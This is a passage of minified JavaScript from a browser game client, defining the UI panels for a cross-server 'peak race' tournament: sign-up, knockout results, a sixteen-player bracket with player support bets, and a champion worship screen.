strict";Object.defineProperty(e,"__esModule",{value:!0}),e.PeakedPanel=void 0;var n=i(1),o=i(1773),s=i(1775),a=i(73),r=i(16),l=i(89),h=i(2),u=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.addDisplay=function(){observe(this,this.upCurState,a.PeakedSys.ins().postState),this.upCurState(),Timer.start(3e4,0,this.sendInfo,this)},e.prototype.sendInfo=function(){a.PeakedSys.ins().isKf()?a.PeakedSys.ins().sendKFInfoList():a.PeakedSys.ins().sendBFInfoList()},e.prototype.upCurState=function(){if(this._curPanel&&r.DisplayUtils.removeFromParent(this._curPanel),a.PeakedSys.ins().isKf()){var t=a.PeakedSys.ins().kfStatus;switch(t==l.KF_PeakStatus.Knockout&&a.PeakedSys.ins().kfStatusIsEnd&&(t=l.KF_PeakStatus.Prom64),t){case l.KF_PeakStatus.None:case l.KF_PeakStatus.Knockout:this.signupPanel||(this.signupPanel=new o.SignupPanel),this._curPanel=this.signupPanel;break;case l.KF_PeakStatus.Prom64:case l.KF_PeakStatus.Prom32:case l.KF_PeakStatus.Prom16:case l.KF_PeakStatus.Prom8:case l.KF_PeakStatus.Prom4:case l.KF_PeakStatus.Finals:this.sixteenPanel||(this.sixteenPanel=new s.SixteenPanel),this._curPanel=this.sixteenPanel}}else{var t=a.PeakedSys.ins().bfStatus;switch(t==l.BF_PeakStatus.Knockout&&(a.PeakedSys.ins().bfStatusIsEnd?t=l.BF_PeakStatus.Prom16:a.PeakedSys.ins().isSignUp||(h.TipsCT.ins().showTips(gettext("您未报名，请等决出16强后再来查看")),t=l.BF_PeakStatus.SignUp)),t){case l.BF_PeakStatus.None:case l.BF_PeakStatus.SignUp:case l.BF_PeakStatus.Knockout:this.signupPanel||(this.signupPanel=new o.SignupPanel),this._curPanel=this.signupPanel;break;case l.BF_PeakStatus.Prom16:case l.BF_PeakStatus.Prom8:case l.BF_PeakStatus.Prom4:case l.BF_PeakStatus.Finals:case l.BF_PeakStatus.Over:this.sixteenPanel||(this.sixteenPanel=new s.SixteenPanel),this._curPanel=this.sixteenPanel}}this._curPanel&&this.addChild(this._curPanel)},e}(n.BaseView);e.PeakedPanel=u,window.PeakedPanel=u,__reflect(u.prototype,"PeakedPanel",[]),window.PeakedPanel=u},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.SignupPanel=void 0;var n=i(1),o=i(73),s=i(89),a=i(1774),r=i(11),l=i(8),h=i(0),u=i(2),p=i(26),d=i(44),c=i(97),f=i(4),g=i(5),m=i(16),v=i(18),y=i(7),C=i(17),T=function(t){function e(){var e=t.call(this)||this;return e._sn_="SignupSkin",e.curKonckRound=0,e.left=0,e.right=0,e.top=0,e.bottom=0,e}return __extends(e,t),e.prototype.addDisplay=function(){if(observe(this,this.upCurState,o.PeakedSys.ins().postState),observe(this,this.upSignUpState,o.PeakedSys.ins().postSignUp),observe(this,this.refRedPoint,C.RedPointBaseSys.ins().RpChange),observe(this,this.upEliminateReport,o.PeakedSys.ins().postEliminateReportData),observe(this,this.upEliminateReport,o.PeakedSys.ins().postKFEliminateReportData),this.refRedPoint(),o.PeakedSys.ins().isKf()){var t=o.PeakedSys.ins().kfStatus;t==s.KF_PeakStatus.Knockout&&0==o.PeakedSys.ins().kfStatusIsEnd?(observe(this,this.upCurState,o.PeakedSys.ins().postBFInfoList),o.PeakedSys.ins().sendBFInfoList()):this.upCurState()}else this.upCurState()},e.prototype.skinComplete=function(){this.eliminateInfoList.itemRenderer=a.PeakKnockoutItemItemRender,this._eliminateInfoDt=new eui.ArrayCollection,this.eliminateInfoList.dataProvider=this._eliminateInfoDt,this.rewardList.itemRenderer=r.ItemBase;var t=l.DateUtils.getFormatBySecond(h.GlobalConfig.PeakRaceBase.KnockOutTime,l.DateUtils.TIME_FORMAT_10);this.info.text=gettext("淘汰赛负{0}场出局,每场间隔{1}",h.GlobalConfig.PeakRaceBase.signUpLose,t),this.addTouchEvent(this.signUpBtn,this.onTouch),this.addTouchEvent(this.eliminateInfoList,this.onTouch),this.addTouchEvent(this.btn_help,this.onTouch)},e.prototype.onTouch=function(t){var e;switch(t.target){case this.signUpBtn:(null===(e=o.PeakedSys.ins().dzRp)||void 0===e?void 0:e.v)?o.PeakedSys.ins().sendSignUp():o.PeakedSys.ins().bfStatus!=s.BF_PeakStatus.Knockout||o.PeakedSys.ins().isSignUp?p.ZsCT.ins().stage<h.GlobalConfig.PeakRaceBase.needZsLv?u.TipsCT.ins().showTips(gettext("需要转生等级到达{0}",h.GlobalConfig.PeakRaceBase.needZsLv)):u.TipsCT.ins().showTips(gettext("当前不在报名时间")):u.TipsCT.ins().showTips(gettext("当前的报名时间已过！"));break;case this.eliminateInfoList:break;case this.btn_help:var i=h.GlobalConfig.HelpInfoConfig[313];win.open("CommonHelpWin",(null===i||void 0===i?void 0:i.text)||"");break;default:if(t.target instanceof eui.Label&&t.target.parent instanceof a.PeakKnockoutItemItemRender&&t.target.name){var n=t.target.parent.data;n?d.ReadPlayerCT.ins().sendFindPlayer(t.target.name,n.servId):d.ReadPlayerCT.ins().sendFindPlayer(t.target.name)}}},e.prototype.upCurState=function(){if(o.PeakedSys.ins().isKf()){var t=o.PeakedSys.ins().kfStatus;switch(t==s.KF_PeakStatus.Knockout&&0==o.PeakedSys.ins().kfStatusIsEnd&&(o.PeakedSys.ins().isSignUp?c.PeakedHelp.isSixteenById(f.ActorCC.actorID)||(u.TipsCT.ins().showTips(gettext("您未进入单服16强，请等决出{0}强后再来查看",64)),t=s.KF_PeakStatus.None):(u.TipsCT.ins().showTips(gettext("您未报名，请等决出64强后再来查看")),t=s.KF_PeakStatus.None)),t){case s.KF_PeakStatus.None:this.signGroup.visible=!0,this.knockoutGroup.visible=!1,this.signUpBtn.visible=!1,this.signed.visible=!1,this.signUpRuleTxt.textFlow=g.TextFlowMaker.generateTextFlow(c.PeakedHelp.getKFTimerRuleStr()),this.rewardList.dataProvider=new eui.ArrayCollection(h.GlobalConfig.PeakRaceBase.croosRewards);break;case s.KF_PeakStatus.Knockout:this.signGroup.visible=!1,this.knockoutGroup.visible=!0,this.signUpBtn.visible=!1,this.signed.visible=!1,o.PeakedSys.ins().sendKFEliminateReport();break;case s.KF_PeakStatus.Prom64:case s.KF_PeakStatus.Prom32:case s.KF_PeakStatus.Prom16:case s.KF_PeakStatus.Prom8:case s.KF_PeakStatus.Prom4:case s.KF_PeakStatus.Finals:}}else{var t=o.PeakedSys.ins().bfStatus;switch(t!=s.BF_PeakStatus.Knockout||o.PeakedSys.ins().isSignUp||(t=s.BF_PeakStatus.SignUp),t){case s.BF_PeakStatus.None:case s.BF_PeakStatus.SignUp:this.signGroup.visible=!0,this.knockoutGroup.visible=!1,o.PeakedSys.ins().isSignUp?(this.signed.visible=!0,this.signUpBtn.visible=!1):this.signed.visible=!1,this.signUpRuleTxt.textFlow=g.TextFlowMaker.generateTextFlow(c.PeakedHelp.getTimerRuleStr()),this.rewardList.dataProvider=new eui.ArrayCollection(h.GlobalConfig.PeakRaceBase.singleRewards);break;case s.BF_PeakStatus.Knockout:this.signGroup.visible=!1,this.knockoutGroup.visible=!0,o.PeakedSys.ins().sendEliminateReport();break;case s.BF_PeakStatus.Prom16:case s.BF_PeakStatus.Prom8:case s.BF_PeakStatus.Prom4:case s.BF_PeakStatus.Finals:}}},e.prototype.upSignUpState=function(t){void 0===t&&(t=-1),o.PeakedSys.ins().isSignUp&&(this.signed.visible=!0,this.signUpBtn.visible=!1,-1!=t&&u.TipsCT.ins().showTips(gettext("成功报名巅峰赛季")))},e.prototype.upEliminateReport=function(){var t=o.PeakedSys.ins(),e=t.isKf()?t.kfKonckReportList:t.bfKonckReportList;this.curKonckRound=t.isKf()?t.kfKonckRound:t.bfKonckRound;var i=t.isKf()?t.kfKonckSurplusNum:t.bfKonckSurplusNum;this._eliminateInfoDt.replaceAll(e),m.DisplayUtils.scrollerToBottom(this.eliminateListScroller);var n=gettext("，我的战绩："),s=c.PeakedHelp.calcEliminateWinNum();if(e.length-s>=h.GlobalConfig.PeakRaceBase.signUpLose)n=gettext("|C:{0}&T:(您已经被淘汰)|",v.ColorUtil.RED),this.nextStartCountdownLabel.visible=!1,this.state2.visible=!1;else{var a=this.curKonckRound-s<0?0:this.curKonckRound-s;n+=gettext("{0}胜{1}负",s,a),Timer.stop(this.onTime,this),Timer.start(1e3,0,this.onTime,this),this.onTime(!0),this.state2.visible=!0}this.eliminateInfoLabel.textFlow=g.TextFlowMaker.generateTextFlow1(gettext("当前淘汰赛第{0}轮，剩余{1}人 {2}",this.curKonckRound,i,n))},e.prototype.onTime=function(t){void 0===t&&(t=!1);var e=o.PeakedSys.ins().isKf()?o.PeakedSys.ins().kfKonckNextTimer:o.PeakedSys.ins().bfKonckNextTimer,i=Math.floor((l.DateUtils.formatMiniDateTime(e)-y.GameServerCC.serverTime)/1e3);i>0?this.nextStartCountdownLabel.text=l.DateUtils.getFormatBySecond(i):(Timer.stop(this.onTime,this),this.nextStartCountdownLabel.text="")},e.prototype.refRedPoint=function(){var t;this.signUpBtn.eRp.visible=null===(t=o.PeakedSys.ins().dzRp)||void 0===t?void 0:t.v},__decorate([delayCall()],e.prototype,"upCurState",null),e}(n.BaseView);e.SignupPanel=T,window.SignupPanel=T,__reflect(T.prototype,"SignupPanel",[]),window.SignupPanel=T},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.PeakKnockoutItemItemRender=void 0;var n=i(3),o=i(18),s=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.dataChanged=function(){this.data&&(this.infoLabel.text=gettext("{0}淘汰赛第{1}场",this.data.servId?gettext("跨服"):gettext("单服"),this.data.round),this.playerName.text=this.data.player?this.data.player:gettext("轮空"),this.playerName.name=this.data.id,this.data.result?(this.result.textColor=o.ColorUtil.GREEN,this.result.text=gettext("胜利")):(this.result.textColor=o.ColorUtil.RED,this.result.text=gettext("失败")))},e}(n.BaseItemRender);e.PeakKnockoutItemItemRender=s,window.PeakKnockoutItemItemRender=s,__reflect(s.prototype,"PeakKnockoutItemItemRender",[]),window.PeakKnockoutItemItemRender=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.SixteenPanel=void 0;var n=i(1),o=i(73),s=i(89),a=i(97),r=i(8),l=i(0),h=i(5),u=i(4),p=i(18),d=i(44),c=function(t){function e(){var e=t.call(this)||this;return e._sn_="SixteenSkin",e._curGroup=0,e.MAX=16,e.PK_GROUP_0=0,e.PK_GROUP_1=1,e.PK_GROUP_2=2,e.PK_GROUP_3=3,e.hasBed=!1,e.lastStatus=0,e._selfSelGroup=-1,e.left=0,e.right=0,e.top=0,e.bottom=0,e}return __extends(e,t),e.prototype.skinComplete=function(){this.myBet.label=gettext("我的支持"),this._linkGroupList=[],this._linkGroupList[this.PK_GROUP_0]=[],this._linkGroupList[this.PK_GROUP_1]=[],this._linkGroupList[this.PK_GROUP_2]=[],this._linkGroupList[this.PK_GROUP_3]=[],this._vsBtnList=[],this._vsBtnList[this.PK_GROUP_1]=[],this._vsBtnList[this.PK_GROUP_2]=[],this._vsBtnList[this.PK_GROUP_3]=[],this._playerLabelList=[];for(var t=1;t<=this.MAX;t++){var e=this["actState_1_"+t],i=this["actState_2_"+t],n=this["actState_3_"+t];e&&(e.name=this.PK_GROUP_1+"_"+t,e.currentState="view",this._vsBtnList[this.PK_GROUP_1].push(e),e.visible=!1),i&&(i.name=this.PK_GROUP_2+"_"+t,i.currentState="view",this._vsBtnList[this.PK_GROUP_2].push(i),i.visible=!1),n&&(n.name=this.PK_GROUP_3+"_"+t,n.currentState="view",this._vsBtnList[this.PK_GROUP_3].push(n),n.visible=!1),this["player"+(t-1)].text="---",this["player"+(t-1)].name="",this._playerLabelList.push(this["player"+(t-1)]);var o=this["link_0_"+t],s=this["link_1_"+t],a=this["link_2_"+t],r=this["link_3_"+t];o&&this._linkGroupList[this.PK_GROUP_0].push(o),s&&this._linkGroupList[this.PK_GROUP_1].push(s),a&&this._linkGroupList[this.PK_GROUP_2].push(a),r&&this._linkGroupList[this.PK_GROUP_3].push(r),this.finals.touchChildren=!1}this.groupBtnSelect0.touchEnabled=!1,this.groupBtnSelect1.touchEnabled=!1,this.groupBtnSelect2.touchEnabled=!1,this.groupBtnSelect3.touchEnabled=!1;for(var l=0,h=this._vsBtnList;l<h.length;l++){var u=h[l];if(u)for(var p=0,d=u;p<d.length;p++){var c=d[p];this.addTouchEvent(c,this.onTouchBtn)}}for(var f=0,g=this._playerLabelList;f<g.length;f++){var m=g[f];this.addTouchEvent(m,this.onTouchPlayer)}this.addTouchEvent(this.myRecord,this.onTouch),this.addTouchEvent(this.myBet,this.onTouch),this.addTouchEvent(this.topRank,this.onTouch),this.addTouchEvent(this.groupBtn1,this.onChargeTab),this.addTouchEvent(this.groupBtn2,this.onChargeTab),this.addTouchEvent(this.groupBtn3,this.onChargeTab),this.addTouchEvent(this.groupBtn0,this.onChargeTab),this.addTouchEvent(this.btn_help,this.onTouch),this.addTouchEvent(this.finals,this.onTouch),this.addTouchEvent(this.vewChampScore,this.onTouch)},e.prototype.addDisplay=function(){observe(this,this.upCurState,o.PeakedSys.ins().postState),observe(this,this.refBetState,o.PeakedSys.ins().postBetInfo),observe(this,this.refBetState,o.PeakedSys.ins().postKFBetInfo),observe(this,this.upSixteenData,o.PeakedSys.ins().postBFInfoList),observe(this,this.upSixteenData,o.PeakedSys.ins().postKFInfoList),this.clearGroupSelect(),this.upCurState(),this.upSixteenData()},e.prototype.removeDisplay=function(){},e.prototype.upCurState=function(){o.PeakedSys.ins().isKf()?(o.PeakedSys.ins().isKFSixteen()?this.currentState="kf":this.currentState="kf_four",this.upKf16Data()):this.currentState="bf",this.upStateData()},e.prototype.upStateData=function(){var t=0;if(o.PeakedSys.ins().isKf()){var e=o.PeakedSys.ins().kfStatus;e==s.KF_PeakStatus.Finals&&0!=o.PeakedSys.ins().kfStatusIsEnd?(this.singleTimeInfoLabel.text=a.PeakedHelp.getNextTimerStr(),this.timerGroup.visible=!1):(o.PeakedSys.ins().kfStatusIsEnd&&e++,t=a.PeakedHelp.kfStatusTimer[e],this.singleTimeInfoLabel.text=r.DateUtils.getFormatBySecond(t,r.DateUtils.TIME_FORMAT_13)+" "+s.PeakedData.STATE_KF_TYPE_CN[e])
}else{var e=o.PeakedSys.ins().bfStatus;if(0==e)return;e==s.BF_PeakStatus.Finals&&0!=o.PeakedSys.ins().bfStatusIsEnd?(this.singleTimeInfoLabel.text=a.PeakedHelp.getNextKfTimerStr(),this.timerGroup.visible=!1):(o.PeakedSys.ins().bfStatusIsEnd&&e++,t=a.PeakedHelp.bfStatusTimer[e],this.singleTimeInfoLabel.text=r.DateUtils.getFormatBySecond(t,r.DateUtils.TIME_FORMAT_13)+" "+s.PeakedData.STATE_TYPE_CN[e])}if(this.timerGroup.visible)for(var i=1;5>=i;i++)this["gameTime"+i+"Txt"].text=r.DateUtils.getFormatBySecond(t,r.DateUtils.TIME_FORMAT_14),t+=l.GlobalConfig.PeakRaceBase.promInterval},e.prototype.refBetState=function(){var t=o.PeakedSys.ins().bfStatus,e=o.PeakedSys.ins().kfStatus,i=o.PeakedSys.ins().isKf();if(i?(e!=this.lastStatus&&(this.hasBed=!1),this.lastStatus=e):(t!=this.lastStatus&&(this.hasBed=!1),this.lastStatus=t),t=o.PeakedSys.ins().bfStatusIsEnd?t+1:t,e=o.PeakedSys.ins().kfStatusIsEnd?e+1:e,o.PeakedSys.ins().bfStatus+1!=s.BF_PeakStatus.Finals&&o.PeakedSys.ins().kfStatus+1!=s.KF_PeakStatus.Finals||!o.PeakedSys.ins().bfStatusIsEnd)this.vewChampScore.textFlow=h.TextFlowMaker.generateTextFlow1(gettext("|U:&T:查看比分"));else{var n=void 0;n=i?a.PeakedHelp.getKFPlayerData(4,1,this._curGroup,o.PeakedSys.ins().isKFSixteen()):a.PeakedHelp.getPlayerData(4,1),n&&a.PeakedHelp.checkIsBet(n.playerList,"4")?this.vewChampScore.textFlow=h.TextFlowMaker.generateTextFlow1(gettext("|U:&T:已支持")):this.vewChampScore.textFlow=h.TextFlowMaker.generateTextFlow1(gettext("|U:&T:决赛支持"))}i?this.vewChampScore.visible=e>s.KF_PeakStatus.Prom4:this.vewChampScore.visible=t>s.BF_PeakStatus.Prom4;for(var r in this._vsBtnList){var l=!1;if(i)if(o.PeakedSys.ins().isKFSixteen()){l=r==this.PK_GROUP_1+""&&e==s.KF_PeakStatus.Prom16||r==this.PK_GROUP_2+""&&e==s.KF_PeakStatus.Prom8||r==this.PK_GROUP_3+""&&e==s.KF_PeakStatus.Prom4;for(var u=0,p=this._vsBtnList[r];u<p.length;u++){var d=p[u];d.visible=r==this.PK_GROUP_1+""&&e>=s.KF_PeakStatus.Prom16||r==this.PK_GROUP_2+""&&e>=s.KF_PeakStatus.Prom8||r==this.PK_GROUP_3+""&&e>=s.KF_PeakStatus.Prom4}}else{l=r==this.PK_GROUP_1+""&&e==s.KF_PeakStatus.Prom64||r==this.PK_GROUP_2+""&&e==s.KF_PeakStatus.Prom32;for(var c=0,f=this._vsBtnList[r];c<f.length;c++){var d=f[c];d.visible=r==this.PK_GROUP_1+""&&e>=s.KF_PeakStatus.Prom64||r==this.PK_GROUP_2+""&&e>=s.KF_PeakStatus.Prom32}}else{l=r==this.PK_GROUP_1+""&&t==s.BF_PeakStatus.Prom16||r==this.PK_GROUP_2+""&&t==s.BF_PeakStatus.Prom8||r==this.PK_GROUP_3+""&&t==s.BF_PeakStatus.Prom4;for(var g=0,m=this._vsBtnList[r];g<m.length;g++){var d=m[g];d.visible=r==this.PK_GROUP_1+""&&t>=s.BF_PeakStatus.Prom16||r==this.PK_GROUP_2+""&&t>=s.BF_PeakStatus.Prom8||r==this.PK_GROUP_3+""&&t>=s.BF_PeakStatus.Prom4}}l=i?l&&0!=o.PeakedSys.ins().kfStatusIsEnd:l&&0!=o.PeakedSys.ins().bfStatusIsEnd,this.hasBed=a.PeakedHelp.checkIsBetByGroup(r);for(var v=0,y=this._vsBtnList[r];v<y.length;v++){var d=y[v];if(d)if(l){var C=d.name.split("_"),n=void 0;if(n=i?a.PeakedHelp.getKFPlayerData(+C[0],+C[1],this._curGroup,o.PeakedSys.ins().isKFSixteen()):a.PeakedHelp.getPlayerData(+C[0],+C[1]),n&&a.PeakedHelp.checkIsBet(n.playerList,r)){d.currentState="beted";break}d.currentState="bet"}else d.currentState="view"}if(l&&this.hasBed)for(var T=0,b=this._vsBtnList[r];T<b.length;T++){var d=b[T];"bet"==d.currentState&&(d.currentState="view")}}},e.prototype.upSixteenData=function(){if(o.PeakedSys.ins().isKf()){if("kf_four"==this.currentState){var t=a.PeakedHelp.findBetKFGroup();t>-1?this._curGroup=t:this._curGroup=this._selfSelGroup>0?this._selfSelGroup:a.PeakedHelp.findKFGroupById(u.ActorCC.actorID),this._curGroup=this._curGroup<0?0:this._curGroup,this["groupBtnSelect"+this._curGroup]&&(this.clearGroupSelect(),this["groupBtnSelect"+this._curGroup].visible=!0)}this.upKf16Data()}else this.up16Data(o.PeakedSys.ins().player16List)},e.prototype.upKf16Data=function(){o.PeakedSys.ins().isKFSixteen()?this.up16Data(o.PeakedSys.ins().kfPlayer16List):o.PeakedSys.ins().kfPlayer64List&&this.up16Data(o.PeakedSys.ins().kfPlayer64List.slice(this._curGroup*this.MAX>>1,this._curGroup*this.MAX+this.MAX>>1))},e.prototype.up16Data=function(t){if(this.clearPlayer(),t)for(var e=0;e<this.MAX;e++)if(e%2==0){var i=t[e/2];i&&i.playerList[0]&&(this["player"+e].text=""+i.playerList[0].playerName,this["player"+e].name=i.playerList[0].playerName+"_"+i.playerList[0].roleId,i.playerList[0].roleId==u.ActorCC.actorID?this["player"+e].textColor=p.ColorUtil.GREEN:this["player"+e].textColor=16298305),i&&i.playerList[1]&&(this["player"+(e+1)].text=""+i.playerList[1].playerName,this["player"+(e+1)].name=i.playerList[1].playerName+"_"+i.playerList[1].roleId,i.playerList[1].roleId==u.ActorCC.actorID?this["player"+(e+1)].textColor=p.ColorUtil.GREEN:this["player"+(e+1)].textColor=16298305)}var n;if(o.PeakedSys.ins().isKf()){if(o.PeakedSys.ins().isKFSixteen()){var s=o.PeakedSys.ins().kfPlayer2Data;s&&s.winId&&(n=a.PeakedHelp.findPlayerDtById(s.winId))}}else{var s=o.PeakedSys.ins().player2Data;s&&s.winId&&(n=a.PeakedHelp.findPlayerDtById(s.winId))}n?(this.championFace.source="yuanhead"+n.job+n.sex,this.championNameLabel.text=n.playerName,this.championNameLabel.name=n.playerName+"_"+n.roleId,this.peaknessProcess.visible=!1,this.finals.visible=!0):(this.championFace.source="",this.championNameLabel.text="",this.championNameLabel.name="",this.peaknessProcess.visible=!0,this.finals.visible=!1),this.upLink(),this.refBetState()},e.prototype.upLink=function(){this.clearLink();var t=o.PeakedSys.ins(),e=[];e=t.isKf()?o.PeakedSys.ins().isKFSixteen()?[t.kfPlayer16List,t.kfPlayer8List,t.kfPlayer4List,[t.kfPlayer2Data]]:[t.kfPlayer64List.slice(this._curGroup*this.MAX>>1,this._curGroup*this.MAX+this.MAX>>1),t.kfPlayer32List.slice(this._curGroup*this.MAX>>2,this._curGroup*this.MAX+this.MAX>>2),t.kfPlayer16List.slice(this._curGroup*this.MAX>>3,this._curGroup*this.MAX+this.MAX>>3),t.kfPlayer8List.slice(this._curGroup*this.MAX>>4,this._curGroup*this.MAX+this.MAX>>4)]:[t.player16List,t.player8List,t.player4List,[t.player2Data]];for(var i=0,n=0,s=e;n<s.length;n++){var r=s[n];if(r&&this._linkGroupList[i].length>0)for(var l=0,h=0,u=r;h<u.length;h++){var p=u[h];p&&(0==p.winPos?a.PeakedHelp.setImgGroupSource(this._linkGroupList[i][2*l],"line_light"):1==p.winPos&&a.PeakedHelp.setImgGroupSource(this._linkGroupList[i][2*l+1],"line_light"),l++)}i++}},e.prototype.onTouchPlayer=function(t){var e=t.target;if(e.name){var i=e.name.split("_"),n=a.PeakedHelp.findPlayerDtById(+i[1]);n?d.ReadPlayerCT.ins().sendFindPlayer(i[1],n.serverId):d.ReadPlayerCT.ins().sendFindPlayer(i[1])}},e.prototype.onTouchBtn=function(t){var e=t.target.parent,i=e.name,n=i.split("_");switch(e.currentState){case"view":win.open("PeakViewBattleReportWin",+n[0],+n[1],this._curGroup);break;case"bet":win.open("PeakBetWin",+n[0],+n[1],this._curGroup);break;case"beted":}},e.prototype.onTouch=function(t){switch(t.target){case this.finals:var e=this.championNameLabel.name.split("_");if(!e[0]||!e[1])return;var i=a.PeakedHelp.findPlayerDtById(+e[1]);i?d.ReadPlayerCT.ins().sendFindPlayer(e[1],i.serverId):d.ReadPlayerCT.ins().sendFindPlayer(e[1]);break;case this.vewChampScore:this.vewChampScore.text==gettext("查看比分")?win.open("PeakViewBattleReportWin",4,1,this._curGroup):this.vewChampScore.text==gettext("决赛支持")&&win.open("PeakBetWin",4,1,this._curGroup);break;case this.myRecord:win.open("PeakMyBattleRecordWin",this._curGroup);break;case this.myBet:win.open("PeakMyBetRecordWin");break;case this.topRank:win.open("PeakTopRankWin");break;case this.btn_help:var n=l.GlobalConfig.HelpInfoConfig[313];win.open("CommonHelpWin",(null===n||void 0===n?void 0:n.text)||"")}},e.prototype.onChargeTab=function(t){switch(this.clearGroupSelect(),t.target){case this.groupBtn0:this._curGroup=0,this.groupBtnSelect0.visible=!0,this.upKf16Data();break;case this.groupBtn1:this._curGroup=1,this.groupBtnSelect1.visible=!0,this.upKf16Data();break;case this.groupBtn2:this._curGroup=2,this.groupBtnSelect2.visible=!0,this.upKf16Data();break;case this.groupBtn3:this._curGroup=3,this.groupBtnSelect3.visible=!0,this.upKf16Data()}this._selfSelGroup=this._curGroup},e.prototype.clearLink=function(){for(var t=0;t<this.MAX;t++)this._linkGroupList[this.PK_GROUP_0][t]&&a.PeakedHelp.setImgGroupSource(this._linkGroupList[this.PK_GROUP_0][t],"line_black"),this._linkGroupList[this.PK_GROUP_1][t]&&a.PeakedHelp.setImgGroupSource(this._linkGroupList[this.PK_GROUP_1][t],"line_black"),this._linkGroupList[this.PK_GROUP_2][t]&&a.PeakedHelp.setImgGroupSource(this._linkGroupList[this.PK_GROUP_2][t],"line_black"),this._linkGroupList[this.PK_GROUP_3][t]&&a.PeakedHelp.setImgGroupSource(this._linkGroupList[this.PK_GROUP_3][t],"line_black")},e.prototype.clearPlayer=function(){for(var t=1;t<=this.MAX;t++)this["player"+(t-1)].text="",this["player"+(t-1)].name=""},e.prototype.clearGroupSelect=function(){this.groupBtnSelect0.visible=!1,this.groupBtnSelect1.visible=!1,this.groupBtnSelect2.visible=!1,this.groupBtnSelect3.visible=!1},__decorate([delayCall()],e.prototype,"upStateData",null),__decorate([delayCall()],e.prototype,"upKf16Data",null),__decorate([delayCall()],e.prototype,"up16Data",null),e}(n.BaseView);e.SixteenPanel=c,window.SixteenPanel=c,__reflect(c.prototype,"SixteenPanel",[]),window.SixteenPanel=c},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.WorshipChampionPanel=void 0;var n=i(1),o=i(21),s=i(44),a=i(73),r=i(89),l=i(0),h=i(18),u=i(5),p=i(16),d=i(2),c=i(6),f=i(17),g=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.addDisplay=function(){observe(this,this.upData,a.PeakedSys.ins().postWorship),observe(this,this.rankData,a.PeakedSys.ins().postKFTopMbRank),observe(this,this.updateRp,f.RedPointBaseSys.ins().RpChange),this.addTouchEvent(this.bodyImg0,this.onTouch),this.addTouchEvent(this.bodyImg1,this.onTouch),this.addTouchEvent(this.bodyImg2,this.onTouch),this.addTouchEvent(this.bodyImg3,this.onTouch),this.addTouchEvent(this.shipBtn,this.onTouch),this.isEff=!1,this.sendInit(),this.initData(),this.upData(),this.rankData(),this.updateRp()},e.prototype.sendInit=function(){a.PeakedSys.ins().sendMbRank()},e.prototype.initData=function(){var t;a.PeakedSys.ins().kfPlayer2Data&&a.PeakedSys.ins().kfPlayer2Data.winId&&a.PeakedSys.ins().kfStatus>=r.KF_PeakStatus.Knockout&&a.PeakedSys.ins().kfStatusIsEnd?(this.shipBtn.enabled=!0,this.chipLabel.visible=!0,this.countLabel.visible=!0):(this.shipBtn.enabled=!1,this.chipLabel.visible=!1,this.countLabel.visible=!1);var e=l.GlobalConfig.PeakRaceBase.begitem,i=(null===(t=l.GlobalConfig.ItemConfig[e])||void 0===t?void 0:t.name)||"";this.chipLabel.text=i+":+"+l.GlobalConfig.PeakRaceBase.mobaiChips},e.prototype.rankData=function(){for(var t=a.PeakedSys.ins().kfTopRankMbList,e=0;4>e;e++)this["r"+e].visible=t[e]?!0:!1,this["r"+e].visible&&(this["name"+e].text=t[e].playerName||"",this["bodyImg"+e].source="Role_zy"+t[e].job)},e.prototype.upData=function(){var t=l.GlobalConfig.PeakRaceBase;t.mobaiNum||(t.mobaiNum=10);var e=a.PeakedSys.ins().worshipNum<t.mobaiNum?h.ColorUtil.GREEN_COLOR_N:h.ColorUtil.RED,i=gettext("膜拜：|C:{0}&T:{1}/{2}",e,a.PeakedSys.ins().worshipNum,t.mobaiNum);this.countLabel.textFlow=u.TextFlowMaker.generateTextFlow1(i),this.isEff&&this.playYHEff()},e.prototype.playYHEff=function(){this.yanHuaMc&&(p.DisplayUtils.removeFromParent(this.yanHuaMc),this.yanHuaMc=null),this.yanHuaMc=new o.MovieClip,this.yanHuaMc.x=270,this.yanHuaMc.y=335,this.addChildAt(this.yanHuaMc,this.numChildren+1),this.yanHuaMc.playFile(RES_DIR_EFF+"FireWork",2),this.isEff=!1},e.prototype.onTouch=function(t){switch(t.target){case this.shipBtn:if(a.PeakedSys.ins().worshipNum>=l.GlobalConfig.PeakRaceBase.mobaiNum)return void d.TipsCT.ins().showTips(gettext("今日膜拜次数已用完！"));if(!a.PeakedSys.ins().kfPlayer2Data.winId)return void d.TipsCT.ins().showTips(gettext("当前没有可膜拜的冠军！"));if(c.BagCT.ins().getAllSurplusCount(1)<0)return void d.TipsCT.ins().showTips(gettext("背包剩余空间不足，请扩容"));this.isEff=!0,a.PeakedSys.ins().sendWorship();break;case this.bodyImg0:case this.bodyImg1:case this.bodyImg2:case this.bodyImg3:var e=Number(t.target.name),i=a.PeakedSys.ins().kfTopRankMbList;if(!i[e])return;s.ReadPlayerCT.ins().sendFindPlayer(i[e].id,i[e].serverId)}},e.prototype.updateRp=function(){var t;this.eRp.visible=null===(t=a.PeakedSys.ins().mbRp)||void 0===t?void 0:t.v},e.prototype.tabRp=function(){var t;return null===(t=a.PeakedSys.ins().mbRp)||void 0===t?void 0:t.v},e}(n.BaseView);e.WorshipChampionPanel=g,window.WorshipChampionPanel=g,__reflect(g.prototype,"WorshipChampionPanel",[]),window.WorshipChampionPanel=g},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.AttriteChangeView=void 0;var n=i(1),o=i(16),s=i(0),a=function(t){function e(){var e=t.call(this)||this;e.bl=new eui.BitmapLabel,e.dic={0:85,2:85,4:120,5:120,6:140,max:200},e.touchEnabled=e.touchChildren=!1,e._sp=new egret.Sprite,e.addChild(e._sp),e._bgImg=new eui.Image,e._sp.addChild(e._bgImg),e.bl.font="num_attr_fnt",e.bl.letterSpacing=-12;var i=new eui.HorizontalLayout;return i.horizontalAlign="center",i.verticalAlign="middle",i.gap=-8,e._sp.addChild(e.bl),e}return 